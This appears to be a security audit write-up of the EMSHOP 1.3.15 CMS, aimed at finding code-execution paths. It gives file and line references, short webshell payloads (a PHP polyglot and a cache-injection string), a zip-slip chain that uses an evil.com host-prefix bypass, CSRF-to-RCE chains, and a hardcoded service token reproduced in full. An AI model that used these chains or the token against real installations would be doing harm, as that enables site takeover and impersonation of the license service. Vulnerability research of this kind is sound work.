# EMSHOP 1.3.15 (emshop_full) audit notes — Aug 2026

Target: `/tmp/emshop_full` — gray-market card-shop CMS (EMSShop). Goal: getshell / code-execution paths. All line numbers from the audited tree.

## Vulnerabilities found

1. **admin/upload.php:9-34 — CSRF image upload.** No `Csrf::validate` anywhere in the POST handler (only `adminRequireLogin`). Same gap in `admin/blog_category.php:275`, `admin/friend_link.php:203`, `admin/goods_category.php:279`, `admin/profile.php:95`, `admin/user_list.php:227`. Asymmetry: `user/merchant/upload.php:19-22` DOES validate CSRF — the main admin side was missed. Impact: forced image upload to logged-in admin (multipart auto-submit), storage-XSS/abuse only; not direct RCE.

2. **include/service/UploadService.php:41-45,84 — no content validation.** Ext whitelist `pathinfo(..., PATHINFO_EXTENSION)` = last segment (`shell.php.jpg` passes), but saved name is rewritten `bin2hex(random_bytes(16)).'.'.$ext` (line 84) → attacker never controls filename → NOT direct RCE. MIME `$file['type']` (line 49) is client-controlled and stored to DB unverified. Image polyglot (GIF89a + `<?php system($_GET[c]);?>`) lands as `.gif`; execution needs server misconfig or a separate LFI.

3. **admin/appstore.php:388-391 + 497-503 — zip-slip + host-prefix bypass → arbitrary PHP write → persistent RCE.** Host check is `strpos($filePath, $baseHost) !== 0` — `https://emshop.ihehe.me.evil.com/poc.zip` passes (boundary char after host is `.`, not `/`). `extractTo()` with no per-entry name filter: entries like `../../../shell.php` escape `content/plugin|template/{name}/` into `EM_ROOT/`. Payload: attacker zip with `../../../shell.php` + `shell.php`; POST `_action=install&type=plugin&name=evil&file_path=https://emshop.ihehe.me.evil.com/poc.zip`. Admin + CSRF required. Once PHP lands in a plugin/template dir, `init.php:137-141` / `init.php:156-161` include it on EVERY request → persistent webshell. This is the main getshell chain.

4. **install/index.php:49-54, 1031-1036, 1249-1266 — single-file install lock.** `installer_is_installed()` = `is_file(install/install.lock)`; installed → 302 to `/`. If any primitive deletes the lock file, unauthenticated attacker POSTs `?action=install` with own `db[host/dbname/username/password]` (can point at attacker MySQL) + `admin[password]`; server overwrites `config.php` (line 1250) with attacker creds → full site/DB takeover + own admin account → then admin-plugin RCE. Chain requires a delete primitive upstream (zip-slip writes, doesn't delete).

5. **init.php:131-146 + include/model/PluginModel.php:192-198 — plugin loader reads enabled list without read-side regex.** `getRuntimeNames`/`getEnabledNames` do raw `explode(',') + trim`; only the WRITE side (`admin/plugin.php:91`, `user/merchant/plugin.php:40`) enforces `^[a-zA-Z0-9_\-]+$`. One SQLi/config write away from traversal in `EM_ROOT.'/content/plugin/'.ltrim($pluginFile,'/').'/'...'.'.php'` (init.php:138) = LFI→RCE. Also: any PHP file placed in an *enabled* plugin dir executes on every request.

6. **admin/update.php:52-81 + include/service/UpdateService.php — admin upgrade = arbitrary file overwrite; CSRF missing.** `download` takes `package_url` straight from POST with NO host allowlist; `package_sha256` also from POST and skipped when empty (UpdateService.php:192). `apply` copies extracted files over `EM_ROOT` (preserve-list only covers uploads/cache/tmp/config.php/.env...). Gated by `LicenseService::isActivated()` (admin/license.php:27-35 `activate` action can set it, also CSRF-less). CSRF chain possible: license.php activate → update.php download/extract/apply → webshell. Fragile bit: `extract` needs exact zip path `content/tmp/update/cache/package_{YmdHis}_{md5(url)8}.zip` (same-second timing or retries).

7. **base.php:8 — hardcoded `SERVICE_TOKEN = '89Z78A9S7D8F9G7H8J9K8L7M9N8B7V8C9X8Z76T54R32E1WQ'`.** Sent with every license-server call (LicenseClient.php:204,451). Source-public = credential public; enables impersonating the default agent to the authorization center; reinforces supply-chain angle: `license_urls` (config.php) server controls update packages + appstore zips (vuln 3/6) — compromise of `emshop.ihehe.me` or `154.44.8.63:10000` = mass RCE on all installs.

8. **include/lib/Cache.php:76,105-116 — PHP file cache, newline-injection surface.** Filename key sanitized (`path()` line 227), but raw key embedded in `// %s` header comment (line 106) and group string in index files (line 258) → `key = "x\nsystem($_GET[c]);//"` would inject code into the cached PHP that `Cache::get()` `require`s. NO current caller passes a user-controlled key (LangModel ints, LanguageModel statics, RateLimit keys = IP validated by `FILTER_VALIDATE_IP`) — latent, not exploitable today.

## Confirmed safe / excluded
- All uploads go through UploadService (whitelist + random rename); no `.htaccess`/double-ext/name-control bypass.
- Front router: `Dispatcher::sanitize()` keeps `[a-zA-Z0-9_-]` + `CONTROLLER_MAP` whitelist (Dispatcher.php:69-94,695-698); `dispatchPluginShow` slug regex + runtime-names check (791-819) → no LFI.
- Template theme names: Cookie override + config both regex + `existsOnDisk` (TemplateModel.php:431-440; View.php:293-306) → traversal blocked.
- Payment callback: `resolvePlugin` regex + hook dispatch only (PaymentCallbackController.php:87-97, PaymentService.php:112-131) — no direct include.
- `server` file: CLI daemon (workers/heartbeat/queue), argv only CLI-reachable — not a web surface.
- No `eval` / `create_function` / `unserialize` / `preg_replace /e` anywhere.
- Storage/TemplateStorage: DB-backed (em_options), no file writes.
- Plugin/template uninstall: name regex-validated; template has realpath boundary check (admin/template.php:51-68).

## Open items (not fully verified — budget ran out)
- `content/plugin/virtual_card/card_actions.php` card-import temp-file handling.
- `include/lib/LicenseClient.php:310-737` upgrade/app-store API details.
- `include/service/UpdateService.php:501+` helpers (splitSqlStatements, removeDir).
- Merchant-side template activation + merchant appstore purchase flows.

## Key exploitation chains
- **Main chain (admin):** appstore zip-slip (vuln 3) → PHP into `content/plugin/` → auto-include every request (vuln 5) → persistent RCE.
- **CSRF chain (admin online):** license.php activate (CSRF-less) → update.php download/extract/apply (CSRF-less) → file overwrite → RCE.
- **Unauthenticated:** nothing direct found; nearest is installer takeover (vuln 4) requiring a delete primitive first.
